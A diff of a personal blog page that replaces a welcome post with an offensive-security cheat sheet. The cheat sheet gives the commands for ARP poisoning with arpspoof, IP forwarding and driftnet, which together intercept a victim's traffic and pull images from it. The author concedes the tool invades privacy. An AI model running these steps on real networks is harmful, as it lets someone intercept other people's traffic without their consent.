@@ -26,15 +26,15 @@ window.cookieconsent.initialise({
   
   
   
-  <title>New beginnings!</title>
-  <meta name="description" content="Jekyll is my new black.">
+  <title>Driftnet with ARP Poisoning</title>
+  <meta name="description" content="">
   
     
-    <meta name="keywords" content="jekyll Lucian Nitescu">
+    <meta name="keywords" content="Lucian Nitescu offensive security cheat sheet sniffing mitm arp">
   
 
   <link rel="stylesheet" href="/assets/main.css">
-  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/12/welcome-to-jekyll/">
+  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/31/driftnet-with-arp-poisoning/">
   
   
   <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
@@ -44,8 +44,8 @@ window.cookieconsent.initialise({
   
   <meta name="twitter:card" content="summary">
   
-  <meta name="twitter:title" content="New beginnings!">
-  <meta name="twitter:description" content="Jekyll is my new black.">
+  <meta name="twitter:title" content="Driftnet with ARP Poisoning">
+  <meta name="twitter:description" content="">
   
   
 
@@ -101,55 +101,55 @@ window.cookieconsent.initialise({
 
   <header class="post-header">
     
-      <h1 class="post-title" itemprop="name headline">New beginnings!</h1>
+      <h1 class="post-title" itemprop="name headline">Driftnet with ARP Poisoning</h1>
     
-    <p class="post-meta"><time datetime="2018-07-12T17:16:45-03:00" itemprop="datePublished">Jul 12, 2018</time> •
-  
-    
-    
-      
-        <a href="/categories/jekyll/">jekyll</a>,
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
+    <p class="post-meta"><time datetime="2018-07-31T19:09:00-03:00" itemprop="datePublished">Jul 31, 2018</time> •
   
     
     
       
     
       
-        <a href="/categories/update/">update</a>
+    
+      
+    
       
     
       
     
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/sniffing/">sniffing</a>,
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/offensive-security/">offensive_security</a>
       
     
       
@@ -182,7 +182,40 @@ window.cookieconsent.initialise({
   </header>
 
   <div class="post-content" itemprop="articleBody">
-    <p>Jekyll is my new black.</p>
+    <p><img src="/uploads/Screenshot%20from%202018-08-01%2001-16-32.png" alt="Image of Driftnet" /></p>
+
+<p><a href="https://github.com/deiv/driftnet">https://github.com/deiv/driftnet</a></p>
+
+<p>Driftnet watches network traffic, and picks out and displays JPEG and GIF images for display. It is a horrific invasion of privacy and shouldn’t be used by anyone anywhere. It can also extract MPEG audio data from the network and play it. If you live in a house with thick walls, this may be a useful way to find out about your neighbours’ musical taste.</p>
+
+<h3 id="installing">Installing</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install driftnet	
+</code></pre></div></div>
+
+<h3 id="preparing-the-machine">Preparing the machine</h3>
+
+<p>As root:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">echo 1 &gt;</span> /proc/sys/net/ipv4/ip_forward
+</code></pre></div></div>
+
+<h3 id="arp-poisoning">ARP Poisoning</h3>
+
+<p>As any user we have to create an arp poisoning in two different terminals:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sudo arpspoof -i tap0 -t &lt;target 1 ip&gt;</span> <span class="nt">-r</span> &lt;target 2 ip or gateway&gt;
+</code></pre></div></div>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sudo arpspoof -i tap0 -t &lt;target 2 ip or gateway&gt;</span> <span class="nt">-r</span> &lt;target 1 ip&gt;
+</code></pre></div></div>
+
+<p>In order to begin collecting images:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sudo driftnet -i &lt;network interface&gt;</span>
+</code></pre></div></div>
+
+<p>The article image is a live example of HTTP delivered website and you can observe all the icons and the placeholder images.</p>
 
   </div>
 
